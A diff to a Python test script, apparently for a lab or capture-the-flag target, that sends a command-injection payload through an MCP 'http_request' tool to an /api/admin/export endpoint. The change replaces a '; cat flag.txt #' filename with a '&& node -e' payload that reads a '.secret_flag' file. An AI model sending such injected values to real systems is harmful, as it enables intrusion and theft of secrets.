@@ -589,14 +589,16 @@ async def test_command_injection():
             result = parse_tool_result(resp)
             token = result.get("body", {}).get("token", "")
 
-            # Command injection
+            # Command injection using node -e (cross-platform: works on both Windows cmd.exe and Linux sh)
+            # On Linux you could also use: "; cat flag.txt #"
             print("[3] Command injection via /api/admin/export...")
+            payload = '&& node -e "process.stdout.write(require(\'fs\').readFileSync(\'.secret_flag\',\'utf8\'))" #'
             resp = await mcp_ws_call(ws, "tools/call", {
                 "name": "http_request",
                 "arguments": {
                     "method": "POST",
                     "path": "/api/admin/export",
-                    "body": {"filename": "; cat flag.txt #"},
+                    "body": {"filename": payload},
                     "headers": {"Authorization": f"Bearer {token}"}
                 }
             }, req_id=3)
